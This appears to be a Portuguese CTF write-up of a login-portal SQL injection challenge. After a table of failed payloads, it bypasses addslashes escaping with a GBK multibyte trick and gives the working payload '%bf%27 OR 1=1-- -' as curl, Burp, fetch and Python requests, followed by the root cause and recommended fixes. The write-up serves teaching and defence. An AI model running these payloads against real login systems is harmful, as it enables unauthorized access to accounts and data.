# SQLi com bypass de charset GBK — PINK+ Access Portal

[← ../index.html#ctf's/PINK+%20CTF%202026](../index.html#ctf's/PINK+%20CTF%202026)

`[ctf's]` · PINK+ CTF 2026 · 2026-11-08 · web / sqli

**Evento:** [PINK+ CTF 2026](https://ctftime.org/event/3331) · [ctf.pink.bayern](https://ctf.pink.bayern/)
**Alvo:** `https://sqli.pink.bayern/`
**Flag:** `PINK{0x5C_is_not_always_a_backslash}`

---

## TL;DR

O portal de login era vulnerável a SQL Injection, mas as aspas eram escapadas por `addslashes`/`mysql_real_escape_string`. O bypass veio de um problema de charset multibyte (**GBK**): o byte `0xBF` seguido da barra invertida `0x5C` inserida pelo escape forma um caractere GBK válido, "engolindo" o backslash e liberando a aspa `0x27` para fechar a string.

Payload (bytes crus no campo `username`):

```
%bf%27 OR 1=1-- -
```

Resposta:

```
Authentication successful
Access granted: PINK{0x5C_is_not_always_a_backslash}
```

---

## 1. Reconhecimento

O alvo era um portal de login ("PINK+ Access Portal") com um formulário `POST /` contendo os campos `username` e `password`. A página informava o alvo:

```
TARGET ACCOUNT
Username: flag
Password: Unknown
```

Observações iniciais:

- Stack: `Apache/2.4.69 (Debian)` com PHP (`index.php`), atrás de `Caddy` (header `Via: 1.1 Caddy`).
- `assets/app.js` apenas alterna a visibilidade da senha — irrelevante para a falha.
- Nenhum cookie de sessão, nenhum token CSRF.
- Enumeração de diretórios: somente `/index.php` e `/assets/` existiam. Sem backups, `.git`, `.env` ou painel alternativo.
- Virtual hosts respondiam diferente conforme o header `Host` (`pink.bayern` → site da equipe, `ctf.pink.bayern` → plataforma CTFd), mas nada adicional para o desafio.

O formulário sempre renderizava o mesmo bloco de resultado em caso de falha:

```html
<div class="result" role="alert" aria-live="polite">
  <strong>Authentication failed</strong>
  <p>Access denied</p>
</div>
```

---

## 2. Testes que falharam

### 2.1 Bypass clássico de autenticação

Todos retornaram exatamente a mesma resposta:

| Payload (username) | Resultado |
|---|---|
| `flag' OR '1'='1` | falhou |
| `flag' OR 1=1-- -` | falhou |
| `flag' OR 1=1#` | falhou |
| `flag'\|\|'1'='1` | falhou |
| `flag'/**/OR/**/1=1-- -` | falhou |
| `' OR '1'='1'-- -` | falhou |
| `flag' OR 1=1 LIMIT 1-- -` | falhou |
| `flag') OR 1=1-- -` | falhou |
| `flag" OR "1"="1` | falhou |
| ``flag` OR 1=1-- -`` | falhou |
| `0 OR 1=1-- -` | falhou |

Também foram testados payloads no campo `password` (com `username=flag`), incluindo `' OR 1=1-- -`, `x') OR 1=1-- -`, `x") OR 1=1-- -` e `x'||'1'='1` — todos falharam.

### 2.2 UNION / ORDER BY

- `UNION SELECT` com 1 a 7 colunas (valores `1` e `'x'`), inclusive com hashes conhecidos (`md5`, `sha1`, `sha256`, `sha512` e **bcrypt** gerado localmente) para o caso de a senha ser comparada via `password_verify`.
- `ORDER BY 1..7`.
- Nenhuma variação alterou a resposta.

### 2.3 Error-based

- MySQL: `extractvalue()`, `updatexml()`, `FLOOR(RAND(0)*2)`.
- PostgreSQL/MSSQL: `CAST(... AS int)`, `WAITFOR DELAY`.
- Nenhum erro SQL foi exibido (o app suprime erros e sempre mostra a mesma mensagem).

### 2.4 Time-based

- MySQL: `SLEEP(10)`, `BENCHMARK(100000000,MD5('a'))`
- PostgreSQL: `pg_sleep(10)`
- Mediana de tempo com payload ≈ mediana do controle (≈ 2 s, ruído de rede). **Nenhum atraso**, indicando que o payload não estava sendo executado como SQL — estava preso dentro de uma string literal.

### 2.5 Outras hipóteses

- HPP (parâmetros duplicados), array params (`username[]`, `password[]`)
- Injeção via `Cookie`, `X-Forwarded-For`, `User-Agent`
- Injeção via GET, JSON body, parâmetros extras (`debug`, `id`, `action`, etc.)
- Fuzzing de ~130 caminhos e ~60 nomes de parâmetros
- Senhas comuns (`flag`, `admin`, `password`, `pink`, etc.)
- Wildcards (`%`, `_`) no campo de senha
- Caracteres nulos, newline, trailing space, variação de caixa

Nenhuma dessas abordagens produziu diferença de status, tamanho, cookies ou mensagem.

---

## 3. Dificuldades encontradas

1. **Mensagem de erro genérica:** o app sempre retornava "Authentication failed / Access denied", tanto para credencial errada quanto para erro de sintaxe SQL. Isso impossibilitou error-based e boolean-based tradicionais.
2. **Escaping eficaz das aspas:** os testes de tempo provaram que o input era escapado antes de entrar na query (`addslashes`/`mysql_real_escape_string`), neutralizando todos os payloads clássicos.
3. **Ruído de rede:** a latência do servidor variava entre ~1,5 s e ~5 s, tornando testes de tempo inconclusivos isoladamente — foi necessário usar múltiplas amostras e medianas.
4. **Sem superfície adicional:** não havia outras rotas, backups, source leak ou parâmetros ocultos; todo o desafio estava concentrado no formulário de login.
5. **Falso positivo de comprimento:** o tamanho da página oscilava entre 3903 e 3909 bytes sem relação com o input (variação do próprio servidor), o que gerou confusão momentânea.

---

## 4. O insight: charset multibyte (GBK)

A aplicação escapava aspas com uma função estilo `addslashes`, mas a conexão com o banco usava um **charset multibyte (GBK)**. No GBK, o byte `0xBF` é o primeiro byte de um caractere de dois bytes, e o byte `0x5C` (barra invertida) pode ser o segundo byte.

Fluxo do bypass:

1. Enviamos o username como bytes crus: `0xBF 0x27` seguido de ` OR 1=1-- -`.
2. O escape vê a aspa `0x27` e insere `0x5C` antes dela:
   `0xBF 0x5C 0x27 OR 1=1-- -`
3. O banco, interpretando GBK, lê `0xBF 0x5C` como **um único caractere válido**. O backslash de escape é consumido.
4. A aspa `0x27` seguinte **não está escapada** e fecha a string.
5. A query resultante fica logicamente:

```sql
SELECT * FROM users WHERE username='縗' OR 1=1-- -' AND password='x'
```

O `OR 1=1` torna a condição verdadeira e o `-- -` comenta o resto (inclusive a checagem de senha).

---

## 5. Exploit

O `%bf` deve ser enviado como **byte cru**, não como UTF-8 (`%C2%BF` não funciona). Além disso, não se pode colar `%bf%27` no formulário do navegador: o navegador codifica o `%` e envia `%25bf%2527`.

### curl

```bash
curl -s -X POST "https://sqli.pink.bayern/" \
  --data-binary "username=%bf%27 OR 1=1-- -&password=x"
```

> Use `--data-binary`, **nunca** `--data-urlencode` (ele recodifica o `%`).

### Burp Suite (Repeater)

```
POST / HTTP/1.1
Host: sqli.pink.bayern
Content-Type: application/x-www-form-urlencoded

username=%bf%27 OR 1=1-- -&password=x
```

### Console do navegador

```js
fetch("/", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "username=%bf%27 OR 1=1-- -&password=x"
}).then(r => r.text()).then(console.log);
```

Não use `URLSearchParams` nem `encodeURIComponent`, senão o `%bf` vira `%25bf`.

### Python

```python
import urllib.request

body = b"username=%bf%27 OR 1=1-- -&password=x"
req = urllib.request.Request(
    "https://sqli.pink.bayern/", data=body, method="POST"
)
print(urllib.request.urlopen(req).read().decode())
```

### Resposta

```html
<div class="result success" role="alert" aria-live="polite">
  <strong>Authentication successful</strong>
  <p>Access granted: PINK{0x5C_is_not_always_a_backslash}</p>
</div>
```

---

## 6. Flag

```
PINK{0x5C_is_not_always_a_backslash}
```

O próprio nome da flag confirma a técnica: `0x5C` é o backslash que foi "engolido" pelo caractere GBK.

---

## 7. Causa raiz

- Uso de **escape manual** (`addslashes` / `mysql_real_escape_string`) em vez de **prepared statements**.
- **Charset da conexão incompatível** com o charset usado na validação/escape (GBK), tornando o escape contornável com bytes multibyte.
- Mensagens de erro genéricas dificultaram a detecção, mas não impediram a exploração.

## 8. Correção recomendada

1. **Prepared statements com parâmetros vinculados** (PDO ou `mysqli` com `bind_param`) — elimina a classe inteira de SQLi, independente de charset.
2. Se for inevitável escapar manualmente, definir o charset da conexão explicitamente **antes** do escape (ex.: `mysqli_set_charset($conn, 'utf8mb4')` ou `charset=utf8mb4` no DSN do PDO).
3. Nunca usar `addslashes` para SQL.
4. Não exibir detalhes internos na resposta de autenticação.
5. Aplicar o princípio do menor privilégio no usuário do banco.

---

## 9. Ferramentas utilizadas

- `curl.exe` para requisições manuais
- **Python 3.14** com `urllib` para automação de fuzzing, testes booleanos, UNION, time-based e envio de bytes crus
- Módulo `bcrypt` (via `pip`) para testar a hipótese de `password_verify` com hashes bcrypt
- Scripts próprios para enumeração de caminhos/parâmetros e comparação de respostas

---

## 10. Lições

- Quando payloads clássicos falham e testes de tempo não disparam, o input provavelmente está escapado — mas **escape não é suficiente**: charset importa.
- **Multibyte charset injection** é um bypass clássico e ainda relevante (GBK, SJIS, BIG5).
- Testar bytes crus (`--data-binary`) em vez de strings UTF-8 foi o ponto decisivo.
- A flag foi projetada exatamente para premiar quem identificou o papel do byte `0x5C`.
